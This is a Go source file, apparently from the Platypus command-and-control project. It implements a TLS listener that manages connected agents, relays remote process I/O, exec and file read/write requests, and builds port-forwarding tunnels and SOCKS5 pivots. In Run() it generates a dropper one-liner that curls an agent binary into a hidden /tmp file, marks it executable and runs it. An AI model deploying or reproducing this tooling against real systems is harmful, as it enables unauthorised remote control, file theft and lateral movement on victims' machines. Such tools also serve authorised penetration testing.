package core

import (
	"bytes"
	"crypto/rand"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"strings"
	"time"

	humanize "github.com/dustin/go-humanize"
	"github.com/jedib0t/go-pretty/v6/table"
	"github.com/phayes/freeport"

	"github.com/WangYihang/Platypus/internal/app"
	"github.com/WangYihang/Platypus/internal/listener"
	"github.com/WangYihang/Platypus/internal/log"
	"github.com/WangYihang/Platypus/internal/utils/crypto"
	"github.com/WangYihang/Platypus/internal/utils/hash"
	"github.com/WangYihang/Platypus/internal/utils/network"
	"github.com/WangYihang/Platypus/internal/utils/str"
	agentpb "github.com/WangYihang/Platypus/pkg/proto/agent/v1"
)

type WebSocketMessage struct {
	Type WebSocketMessageType
	Data interface{}
}

// Compile-time check: TCPServer implements listener.Listener
var _ listener.Listener = (*TCPServer)(nil)

// TCPServer is a TLS ingress port where agents dial in.
type TCPServer struct {
	Host           string                      `json:"host"`
	GroupDispatch  bool                        `json:"group_dispatch"`
	Port           uint16                      `json:"port"`
	AgentClients map[string](*AgentClient) `json:"agent_clients"`
	TimeStamp      time.Time                   `json:"timestamp"`
	Interfaces     []string                    `json:"interfaces"`
	Hash           string                      `json:"hash"`
	DisableHistory bool                        `json:"disable_history"`
	PublicIP       string                      `json:"public_ip"`
	ShellPath      string                      `json:"shell_path"`
	hashFormat     string                      `json:"-"`
	stopped        chan struct{}               `json:"-"`
}

func (s *TCPServer) GetHash() string { return s.Hash }
func (s *TCPServer) GetHost() string { return s.Host }
func (s *TCPServer) GetPort() uint16 { return s.Port }

// CreateTCPServer registers a new TLS listener. Agents dial in with
// TLS+protobuf; no plain-TCP fallback is accepted.
func CreateTCPServer(host string, port uint16, hashFormat string, disableHistory bool, PublicIP string, ShellPath string) *TCPServer {
	service := fmt.Sprintf("%s:%d", host, port)

	if _, ok := Ctx.Servers[hash.MD5(service)]; ok {
		log.Error("The server (%s) already exists", service)
		return nil
	}

	// Default hashFormat
	if hashFormat == "" {
		hashFormat = "%i %u %m %o %t"
	}

	tcpServer := &TCPServer{
		Host:           host,
		Port:           port,
		GroupDispatch:  true,
		AgentClients: make(map[string](*AgentClient)),
		Interfaces:     []string{},
		TimeStamp:      time.Now(),
		hashFormat:     hashFormat,
		Hash:           hash.MD5(fmt.Sprintf("%s:%d", host, port)),
		stopped:        make(chan struct{}, 1),
		DisableHistory: disableHistory,
		PublicIP:       PublicIP,
		ShellPath:      ShellPath,
	}

	Ctx.Servers[hash.MD5(service)] = tcpServer

	// Gather listening interfaces
	tcpServer.Interfaces = network.GatherInterfacesList(tcpServer.Host)

	// Distributor route so the agent binary download URL can address this listener
	for _, ifaddr := range tcpServer.Interfaces {
		routeKey := str.RandomString(0x08)
		Ctx.Distributor.(*Distributor).Route[fmt.Sprintf("%s:%d", ifaddr, port)] = routeKey
	}

	// Fetch real public IP address if not specified
	if tcpServer.PublicIP == "" {
		log.Info("Detecting Public IP address of the interface...")
		ip, err := network.GetPublicIP()
		if err != nil {
			log.Error("Public IP Detection failed: %s", err.Error())
		}
		tcpServer.PublicIP = ip
		log.Success("Public IP Detected: %s", tcpServer.PublicIP)
	} else {
		log.Info("Public IP (%s) is set in config file.", tcpServer.PublicIP)
	}

	// Use /bin/bash if no ShellPath was specified
	if tcpServer.ShellPath == "" {
		log.Info("No ShellPath was specified, using /bin/bash...")
		tcpServer.ShellPath = "/bin/bash"
	} else {
		log.Info("ShellPath (%s) is set in config file.", tcpServer.ShellPath)
	}

	// Try to check
	log.Info("Trying to create server on: %s", service)
	if _, err := net.ResolveTCPAddr("tcp4", service); err != nil {
		log.Error("Resolve TCP address failed: %s", err)
		DeleteServer(tcpServer)
		return nil
	}

	probe, err := net.Listen("tcp", service)
	if err != nil {
		log.Error("Listen failed: %s", err)
		DeleteServer(tcpServer)
		return nil
	}
	probe.Close()

	return tcpServer
}

func (s *TCPServer) Handle(conn net.Conn) {
	client := CreateAgentClient(conn, s, s.DisableHistory)
	log.Info("Gathering information from client...")
	if client.GatherClientInfo(s.hashFormat) {
		log.Info("Agent (v%s) connected from %s", client.Version, client.conn.RemoteAddr())
		s.AddAgentClient(client)
	} else {
		log.Info("Failed to check encrypted income connection from %s", client.conn.RemoteAddr())
		client.Close()
	}
}

func (s *TCPServer) Run() {
	service := fmt.Sprintf("%s:%d", s.Host, s.Port)

	certBuilder := new(strings.Builder)
	keyBuilder := new(strings.Builder)
	crypto.Generate(certBuilder, keyBuilder)

	pemContent := []byte(fmt.Sprint(certBuilder))
	keyContent := []byte(fmt.Sprint(keyBuilder))

	cert, err := tls.X509KeyPair(pemContent, keyContent)
	if err != nil {
		log.Error("Listener failed to load keys: %s", err)
		DeleteServer(s)
		return
	}
	tlsConfig := tls.Config{Certificates: []tls.Certificate{cert}}
	tlsConfig.Rand = rand.Reader

	ln, err := tls.Listen("tcp", service, &tlsConfig)
	if err != nil {
		log.Error("Listen failed: %s", err)
		DeleteServer(s)
		return
	}
	log.Info("Server running at: %s", s.FullDesc())

	for _, ifname := range s.Interfaces {
		listenerHostPort := fmt.Sprintf("%s:%d", ifname, s.Port)
		log.Warn("Agents should dial: %s", listenerHostPort)
		for _, ifaddr := range Ctx.Distributor.(*Distributor).Interfaces {
			distributorHostPort := fmt.Sprintf("%s:%d", ifaddr, Ctx.Distributor.(*Distributor).Port)
			filename := fmt.Sprintf("/tmp/.%s", str.RandomString(0x08))
			command := "curl -fsSL http://" + distributorHostPort + "/agent/" + listenerHostPort + " -o " + filename + " && chmod +x " + filename + " && " + filename
			log.Warn("\t`%s`", command)
		}
	}

	for {
		select {
		case <-s.stopped:
			ln.Close()
			return
		default:
			conn, err := ln.Accept()
			if err != nil {
				continue
			}
			go s.Handle(conn)
		}
	}
}

func (s *TCPServer) AsTable() {
	if len(s.AgentClients) > 0 {
		t := table.NewWriter()
		t.SetOutputMirror(os.Stdout)
		t.SetTitle(fmt.Sprintf(
			"%s is listening on %s:%d, %d clients",
			s.Hash,
			s.Host,
			s.Port,
			len(s.AgentClients),
		))

		t.AppendHeader(table.Row{"Hash", "Network", "OS", "User", "Python", "Time", "Alias", "GroupDispatch"})

		for chash, client := range s.AgentClients {
			t.AppendRow([]interface{}{
				chash,
				client.conn.RemoteAddr().String(),
				client.OS.String(),
				client.User,
				client.Python2 != "" || client.Python3 != "",
				humanize.Time(client.TimeStamp),
				client.Alias,
				client.GroupDispatch,
			})
		}

		t.Render()
		log.Success("%s is listening on %s:%d, %d clients listed",
			s.Hash, s.Host, s.Port, len(s.AgentClients))
	} else {
		log.Warn("[%s] is listening on %s:%d, 0 clients",
			s.Hash, s.Host, s.Port)
	}
}

func (s *TCPServer) OnelineDesc() string {
	var buffer bytes.Buffer
	buffer.WriteString(
		fmt.Sprintf(
			"%s:%d (%d online clients)",
			s.Host,
			s.Port,
			len(s.AgentClients),
		),
	)
	return buffer.String()
}

func (s *TCPServer) FullDesc() string {
	var buffer bytes.Buffer
	buffer.WriteString(
		fmt.Sprintf(
			"[%s] %s:%d (%d online clients) (started at: %s)",
			s.Hash,
			s.Host,
			s.Port,
			len(s.AgentClients),
			humanize.Time(s.TimeStamp),
		),
	)
	var descs []string
	for _, client := range s.AgentClients {
		descs = append(descs, fmt.Sprintf("\t%s", client.FullDesc()))
	}
	if len(descs) > 0 {
		buffer.WriteString("\n")
	}
	buffer.WriteString(strings.Join(descs, "\n"))
	return buffer.String()
}

func (s *TCPServer) Stop() {
	log.Info("Stopping server: %s", s.OnelineDesc())
	s.stopped <- struct{}{}

	for _, client := range s.AgentClients {
		s.DeleteAgentClient(client)
	}
}

type WebSocketMessageType int

const (
	CLIENT_CONNECTED WebSocketMessageType = iota
	CLIENT_DUPLICATED
	SERVER_DUPLICATED
)

func (s *TCPServer) NotifyWebSocketDuplicateAgentClient(client *AgentClient) {
	// WebSocket Broadcast
	type ClientDuplicateMessage struct {
		Client     AgentClient
		ServerHash string
	}
	msg, _ := json.Marshal(WebSocketMessage{
		Type: CLIENT_DUPLICATED,
		Data: ClientDuplicateMessage{
			Client:     *client,
			ServerHash: s.Hash,
		},
	})
	// Notify to all websocket clients
	if Ctx.NotifyWebSocket != nil {
		Ctx.NotifyWebSocket.Broadcast(msg)
	}
}

func (s *TCPServer) NotifyWebSocketOnlineAgentClient(client *AgentClient) {
	// WebSocket Broadcast
	type ClientOnlineMessage struct {
		Client     AgentClient
		ServerHash string
	}
	msg, _ := json.Marshal(WebSocketMessage{
		Type: CLIENT_CONNECTED,
		Data: ClientOnlineMessage{
			Client:     *client,
			ServerHash: s.Hash,
		},
	})
	// Notify to all websocket clients
	if Ctx.NotifyWebSocket != nil {
		Ctx.NotifyWebSocket.Broadcast(msg)
	}
}

// Encrypted clients
func (s *TCPServer) AddAgentClient(client *AgentClient) {
	client.GroupDispatch = s.GroupDispatch
	if _, exists := s.AgentClients[client.Hash]; exists {
		log.Error("Duplicated income connection detected!")

		// Respond to agent that the client is duplicated
		err := client.Send(&agentpb.Envelope{
			Payload: &agentpb.Envelope_DuplicateClient{
				DuplicateClient: &agentpb.DuplicateClientNotice{},
			},
		})

		if err != nil {
			// TODO: handle network error
			log.Error("Network error: %s", err)
		}

		s.NotifyWebSocketDuplicateAgentClient(client)
		client.Close()
	} else {
		log.Success("Encrypted fire in the hole: %s", client.OnelineDesc())
		s.AgentClients[client.Hash] = client
		s.NotifyWebSocketOnlineAgentClient(client)
		// Message Dispatcher
		go func(client *AgentClient) { AgentMessageDispatcher(client) }(client)
	}
}

func AgentMessageDispatcher(client *AgentClient) {
	for {
		env, err := client.Recv()
		if err != nil {
			log.Error("Read from client %s failed", client.OnelineDesc())
			DeleteAgentClient(client)
			break
		}

		switch p := env.Payload.(type) {
		case *agentpb.Envelope_Stdio:
			key := p.Stdio.Key
			if process, exists := client.processes[key]; exists {
				if process.WebSocket != nil {
					process.WebSocket.WriteBinary([]byte("0" + string(p.Stdio.Data)))
				} else {
					os.Stdout.Write(p.Stdio.Data)
				}
			}
		case *agentpb.Envelope_ProcessStartedResponse:
			key := p.ProcessStartedResponse.Key
			if process, exists := client.processes[key]; exists {
				process.Pid = int(p.ProcessStartedResponse.Pid)
				process.State = started
				log.Success("Process (%d) started", process.Pid)
				if process.WebSocket != nil {
					client.currentProcessKey = key
				}
			}
		case *agentpb.Envelope_ProcessStopped:
			key := p.ProcessStopped.Key
			if process, exists := client.processes[key]; exists {
				process.State = terminated
				delete(client.processes, key)
				log.Error("Process (%d) stop: %d", process.Pid, p.ProcessStopped.ExitCode)
				if process.WebSocket != nil {
					process.WebSocket.Close()
					client.currentProcessKey = ""
				}
			}
		case *agentpb.Envelope_TunnelConnectedResponse:
			token := p.TunnelConnectedResponse.TunnelId
			log.Success("Tunnel (%s) connected", token)
			if ti, exists := Ctx.PullTunnelInstance[token]; exists {
				go func() {
					for {
						buffer := make([]byte, 0x400)
						n, err := (*ti.Conn).Read(buffer)
						if err != nil {
							log.Success("Tunnel (%s) disconnected: %s", token, err.Error())
							ti.Agent.(*AgentClient).Send(&agentpb.Envelope{
								Payload: &agentpb.Envelope_TunnelCloseRequest{
									TunnelCloseRequest: &agentpb.TunnelCloseRequest{TunnelId: token},
								},
							})
							(*ti.Conn).Close()
							break
						}
						if n > 0 {
							WriteTunnel(ti.Agent.(*AgentClient), token, buffer[0:n])
						}
					}
				}()
			}
		case *agentpb.Envelope_TunnelConnectFailed:
			token := p.TunnelConnectFailed.TunnelId
			if ti, exists := Ctx.PullTunnelInstance[token]; exists {
				log.Error("Tunnel connect failed: %s: %s", token, p.TunnelConnectFailed.Reason)
				(*ti.Conn).Close()
				delete(Ctx.PullTunnelInstance, token)
			}
		case *agentpb.Envelope_TunnelDisconnected:
			token := p.TunnelDisconnected.TunnelId
			if ti, exists := Ctx.PullTunnelInstance[token]; exists {
				log.Error("%s disconnected", token)
				(*ti.Conn).Close()
				delete(Ctx.PullTunnelInstance, token)
			}
		case *agentpb.Envelope_TunnelData:
			token := p.TunnelData.TunnelId
			data := p.TunnelData.Data
			if ti, exists := Ctx.PullTunnelInstance[token]; exists {
				(*ti.Conn).Write(data)
			}
			if ti, exists := Ctx.PushTunnelInstance[token]; exists {
				if _, err := (*ti.Conn).Write(data); err != nil {
					ti.Agent.(*AgentClient).Send(&agentpb.Envelope{
						Payload: &agentpb.Envelope_TunnelConnectFailed{
							TunnelConnectFailed: &agentpb.TunnelConnectFailed{TunnelId: token, Reason: err.Error()},
						},
					})
					(*ti.Conn).Close()
					delete(Ctx.PushTunnelInstance, token)
				}
			}
		case *agentpb.Envelope_TunnelConnectRequest:
			// Push tunnel: agent accepted a connection, server dials local target
			token := p.TunnelConnectRequest.TunnelId
			address := p.TunnelConnectRequest.Address
			if tc, exists := Ctx.PushTunnelConfig[address]; exists {
				log.Info("Connecting to %s", tc.Address)
				conn, err := net.Dial("tcp", tc.Address)
				if err != nil {
					log.Error("Connecting to %s failed: %s", tc.Address, err.Error())
					tc.Agent.(*AgentClient).Send(&agentpb.Envelope{
						Payload: &agentpb.Envelope_TunnelConnectFailed{
							TunnelConnectFailed: &agentpb.TunnelConnectFailed{TunnelId: token, Reason: err.Error()},
						},
					})
				} else {
					log.Success("Connecting to %s succeed", tc.Address)
					Ctx.PushTunnelInstance[token] = app.PushTunnelInstance{Agent: tc.Agent, Conn: &conn}
					tc.Agent.(*AgentClient).Send(&agentpb.Envelope{
						Payload: &agentpb.Envelope_TunnelConnectedResponse{
							TunnelConnectedResponse: &agentpb.TunnelConnectedResponse{TunnelId: token},
						},
					})
					go func() {
						for {
							buffer := make([]byte, 0x400)
							n, err := conn.Read(buffer)
							if err != nil {
								tc.Agent.(*AgentClient).Send(&agentpb.Envelope{
									Payload: &agentpb.Envelope_TunnelDisconnected{
										TunnelDisconnected: &agentpb.TunnelDisconnectedNotice{TunnelId: token, Reason: err.Error()},
									},
								})
								conn.Close()
								delete(Ctx.PushTunnelInstance, token)
								break
							}
							tc.Agent.(*AgentClient).Send(&agentpb.Envelope{
								Payload: &agentpb.Envelope_TunnelData{
									TunnelData: &agentpb.TunnelData{TunnelId: token, Data: buffer[0:n]},
								},
							})
						}
					}()
				}
			}
		case *agentpb.Envelope_TunnelClosed:
			token := p.TunnelClosed.TunnelId
			if ti, exists := Ctx.PushTunnelInstance[token]; exists {
				(*ti.Conn).Close()
				delete(Ctx.PushTunnelInstance, token)
			}
		case *agentpb.Envelope_TunnelCreatedResponse:
			address := p.TunnelCreatedResponse.Address
			if tc, exists := Ctx.PushTunnelConfig[address]; exists {
				log.Success("Tunnel created: %s", tc.Address)
			}
		case *agentpb.Envelope_TunnelCreateFailed:
			address := p.TunnelCreateFailed.Address
			if _, exists := Ctx.PushTunnelConfig[address]; exists {
				log.Error("Tunnel create failed: %s: %s", address, p.TunnelCreateFailed.Reason)
				delete(Ctx.PushTunnelConfig, address)
			}
		case *agentpb.Envelope_Socks5CreatedResponse:
			port := p.Socks5CreatedResponse.Port
			localAddr := fmt.Sprintf("127.0.0.1:%d", freeport.GetPort())
			remoteAddr := fmt.Sprintf("127.0.0.1:%d", port)
			log.Success("Mapping remote socks server (%s) into local address (%s)", remoteAddr, localAddr)
			AddPullTunnelConfig(Ctx.CurrentAgent.(*AgentClient), localAddr, remoteAddr)
		case *agentpb.Envelope_Socks5CreateFailed:
			log.Error("%s", p.Socks5CreateFailed.Reason)

		// RPC responses — route to EnvelopeQueue by request_id
		case *agentpb.Envelope_ExecResponse,
			*agentpb.Envelope_ReadFileResponse,
			*agentpb.Envelope_FileSizeResponse,
			*agentpb.Envelope_WriteFileResponse:
			token := env.RequestId
			Ctx.MessageQueueMu.RLock()
			ch, exists := Ctx.EnvelopeQueue[token]
			Ctx.MessageQueueMu.RUnlock()
			if exists {
				ch <- env
			} else {
				log.Error("No such channel: %s", token)
			}
		}
	}
}

func (s *TCPServer) DeleteAgentClient(client *AgentClient) {
	delete(s.AgentClients, client.Hash)
	client.Close()
}

func (s *TCPServer) GetAllAgentClients() map[string](*AgentClient) {
	return s.AgentClients
}
